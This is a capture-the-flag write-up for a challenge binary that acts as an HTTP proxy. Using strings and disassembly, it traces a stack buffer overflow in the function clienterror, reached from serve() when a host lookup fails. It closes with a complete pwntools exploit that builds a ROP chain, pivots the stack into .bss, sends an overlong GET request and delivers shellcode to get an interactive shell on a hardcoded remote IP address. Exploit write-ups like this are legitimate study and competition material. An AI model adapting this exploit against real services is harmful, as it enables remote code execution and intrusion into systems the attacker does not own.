It was fairly obvious it was a proxy from strings

```text
Not found
GET %s HTTP/1.0
Host: %s
%s http://%s %s
Proxy does not implement this method
```

The third argument in sscanf could be ooverflown since read is called with
0x800 byes and the buffer is only 0x400.

```objdump
sub    esp,0x24f0
lea    ecx,[esp+0x1c24]
mov    DWORD PTR [esp+0x10],ecx
```
However as we can see the stack is large enough and the space above is writen
to before use.

A quick glance at clienterror reveals that it should be possible to make a
overflow here if we can control one of the three inputs. But in the main
function, we have no luck.

```objdump
mov    DWORD PTR [esp+0xc],0x8049b34
mov    DWORD PTR [esp+0x8],0x8049b59
mov    DWORD PTR [esp+0x4],0x8049b69
mov    eax,DWORD PTR [esp+0x24b8] ; socket
mov    DWORD PTR [esp],eax
call   8048d16 <clienterror>
```

Onwards to serve()!
call to clienterror with an argument? Check.

```objdump
lea    eax,[ebp-0x1894]
mov    DWORD PTR [esp+0xc],eax
mov    DWORD PTR [esp+0x8],0x8049ab8
mov    DWORD PTR [esp+0x4],0x8049ac2
mov    eax,DWORD PTR [ebp+0x8] ;socket
mov    DWORD PTR [esp],eax
call   8048d16 <clienterror>
```

This code is called if gethostnameby_r fails.

What is left is the ropping. pwntools to the rescue!

```python
#!/usr/bin/env python

from pwn import *

context('i386', 'linux', 'ipv4')

#HOST = '127.0.0.1'
HOST = '184.72.73.160'
PORT = 33227

r = remote(HOST, PORT, timeout = None)
p = rop.ROP('./pork-8c2fdf93e211c7358e0192a24bc951843da672b1')

buf = p.sections['.bss'] + ord('A')
shellcode = asm(shellcode.findpeersh())

p.call('read', [4, buf+5*4, len(shellcode)])
p.call(buf+5*4)

pivot_rop = p.flush()

for n,c in enumerate(pivot_rop):
    p.call('sprintf', [buf+n, p.search(c).next()])

p.migrate(buf)

rop_chain = p32(p._gadgets['popret'][3][0])*4 + p.generate()

pause()
r.send('GET http://' + 'A'.ljust(1024, 'A') + rop_chain + ' HTTP/1.1\r\n')
sleep(1.0)
r.send('\r\n')
sleep(1.0)
r.send(shellcode)
r.interactive()
```
